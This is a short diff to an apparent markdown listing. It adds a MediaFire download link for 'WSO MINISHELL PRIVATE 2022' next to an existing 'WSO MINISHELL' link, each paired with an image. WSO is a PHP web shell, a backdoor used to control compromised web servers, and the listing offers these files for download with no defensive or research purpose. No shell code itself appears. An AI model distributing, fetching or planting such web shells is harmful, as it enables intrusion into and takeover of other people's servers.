@@ -211,3 +211,6 @@ Date : 10 January 2023
   
 # <a href="https://www.mediafire.com/file/qme387j69q0i4yj/wsomini.php/file">WSO MINISHELL</a> 
 <img src="https://i.imgur.com/mflx93G.png" alt="beruangsalju profile">
+	
+# <a href="https://www.mediafire.com/file/ef2eouclw5imwgs/wso-mini.php/file">WSO MINISHELL PRIVATE 2022</a> 
+<img src="https://i.imgur.com/fkAWBaB.png" alt="beruangsalju profile">
